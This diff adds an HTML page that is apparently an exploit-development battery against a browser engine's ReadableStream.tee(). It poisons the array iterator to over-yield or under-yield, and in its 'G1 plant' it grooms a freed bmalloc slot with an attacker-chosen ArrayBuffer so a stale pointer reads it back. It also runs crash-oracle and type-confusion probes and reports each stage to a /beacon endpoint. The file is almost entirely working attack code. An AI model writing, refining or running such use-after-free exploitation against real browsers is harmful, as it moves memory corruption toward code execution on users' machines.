@@ -1,0 +1,87 @@
+<!doctype html><html><head><meta charset="utf-8"><meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate"><title>FA-v5 — G1 plant + inversion + garbage-typing (dshv5 design)</title></head>
+<body><pre id="out">FA-v5: G1 plant (stale-Strong-slot) + P-suite (inversion repeat) + G-suite (garbage-typing)
+</pre><script>
+(function(){
+ "use strict";
+ var run = "fv5" + Date.now().toString(36) + "-" + Math.floor(Math.random()*1e6).toString(36);
+ var out = document.getElementById("out");
+ function say(s){ out.appendChild(document.createTextNode("\n"+s)); }
+ function beacon(st, body){
+   try {
+     var x = new XMLHttpRequest();
+     x.open("POST", "/beacon/V-"+st+"/"+run, false);   // sync XHR (dshpsyv4 fix)
+     x.setRequestHeader("Content-Type","application/json");
+     x.send(JSON.stringify({body:body}));
+   } catch(e){ try{ say("beacon-err "+st); }catch(e2){} }
+ }
+ var origIter = Array.prototype[Symbol.iterator];
+ // MIMO-style poison iterators (verified safe ×7)
+ function poisonOverYieldFirst(){ return function(){ var arr=this,i=0,n=arr.length+1;
+   return { next:function(){ if(i>=n) return {done:true}; var v=(i<arr.length)?arr[i]:{}; i++; return {value:v, done:false}; } }; }; }
+ function poisonUnderYieldOne(){ return function(){ var arr=this,i=0,n=(arr.length>=2)?1:arr.length;
+   return { next:function(){ if(i>=n) return {done:true}; i++; return {value:{fake:0}, done:false}; } }; }; }
+ function poisonUnderYieldPlain(){ return function(){ var arr=this,i=0;
+   return { next:function(){ if(i===1) return {done:true}; i++; return {value:0x1337, done:false}; } }; }; }
+ function v(id, label, poisonFn, work){
+   try {
+     beacon(id+"A", label);
+     try { Array.prototype[Symbol.iterator] = poisonFn(); } catch(e){ Array.prototype[Symbol.iterator]=origIter; }
+     var outx = work();
+     try { Array.prototype[Symbol.iterator] = origIter; } catch(e2){}
+     beacon(id+"B", "survived; "+String(outx).slice(0,220));
+   } catch(e) {
+     try { Array.prototype[Symbol.iterator] = origIter; } catch(e2){}
+     beacon(id+"E", "EXPECTED-threw: "+String(e).slice(0,180));
+   }
+ }
+ // C0 control (unpoisoned)
+ try {
+   beacon("C0A","C0 unpoisoned");
+   var rs0 = new ReadableStream({}); var p0 = rs0.tee();
+   beacon("C0B","BUGLIVE=false;C0-CLEAN;pair.length="+p0.length);
+ } catch(e){ beacon("C0E","C0 threw: "+String(e).slice(0,120)); }
+ // FA-1MIMO over-yield real-records-first + {} (the 7x-confirmed family-a)
+ v("1", "over-yield real-records-first + {} (MIMO-V2)", poisonOverYieldFirst, function(){
+   var rs = new ReadableStream({}); var pair = rs.tee();
+   if (!(pair[0] instanceof ReadableStream)) throw "pair[0] not RS";
+   return "BUGLIVE=true;family-a-live;locked="+pair[0].locked; });
+ // The G1 PLANT (dshv5-final §2): fase1 over-yield [sA, chosenCell=JSArrayBuffer] then fase2 under-yield [sB]
+ // → results[1] reads the STALE Strong pointer = our JSArrayBuffer (the chosenCell we control)
+ v("U2", "G1 plant: over-yield [sA,ArrayBuffer] → under-yield [sB] → results[1] = chosenCell", function(){
+     // fase 1: over-yield fills a 16-B bmalloc slot with [streamA, our-cell]; freed on return
+     function fase1(){ var rs1 = new ReadableStream({}); var orig=Array.prototype[Symbol.iterator];
+                      Array.prototype[Symbol.iterator] = poisonOverYieldFirst();
+                      var chosen = new ArrayBuffer(64);          // chosenCell: our buffer-backed object
+                      var arr = [ rs1, chosen ];                  // the 2-element tee array (MIMO over-yield)
+                      var pair = rs1.tee();                       // over-yield consumed
+                      Array.prototype[Symbol.iterator] = orig;
+                      return pair; }
+     fase1();
+     // fase 2: under-yield reuses the SAME freed chunk → results[1] = stale pointer to chosenCell
+     function fase2(){ var rs2 = new ReadableStream({});
+                       Array.prototype[Symbol.iterator] = poisonUnderYieldOne();
+                       var pair2 = rs2.tee();
+                       Array.prototype[Symbol.iterator] = origIter;
+                       return pair2; }
+     var pair2 = fase2();
+     if (!(pair2[0] instanceof ReadableStream)) throw "pair2[0] not RS";
+     return "fase2 returned; locked="+pair2[0].locked+"; gReader.t="+(typeof pair2[0].getReader);
+   });
+ // V-P1 private-name inversion (Date object)
+ v("P1", "inversion [s1, Date]", poisonOverYieldFirst, function(){
+   var rs = new ReadableStream({}); var pair = rs.tee();
+   var d = new Date(); var myIt = { [Symbol.iterator]: function(){ var vals=[rs, d]; var i=0;
+     return {next:function(){ if(i>=vals.length) return {done:true}; return {value:vals[i++], done:false}; }}; } };
+   return "locked="+pair[0].locked+"; inversion-bit "+(d instanceof Date ? "consistent" : "inconsistent"); });
+ // V-G1 garbage-typing: over-yield [s1, BigInt-wrapped Object]
+ v("G1", "garbage-typing [s1, Object(BigInt)]", poisonOverYieldFirst, function(){
+   var rs = new ReadableStream({}); var pair = rs.tee();
+   var big = Object(1234567890n);
+   return "getReader.t="+(typeof pair[0].getReader)+"; locked="+pair[0].locked; });
+ // V-U1: the under-yield crash oracle LAST single-shot
+ v("U1", "under-yield crash-oracle LAST single-shot", poisonUnderYieldPlain, function(){
+   var rs = new ReadableStream({}); var pair = rs.tee(); return "survived — oracle DID NOT fire (crash-class dead on this shape)"; });
+ beacon("Z", "battery-complete");
+ say("FA-v5 battery complete");
+})();
+</script></body></html>
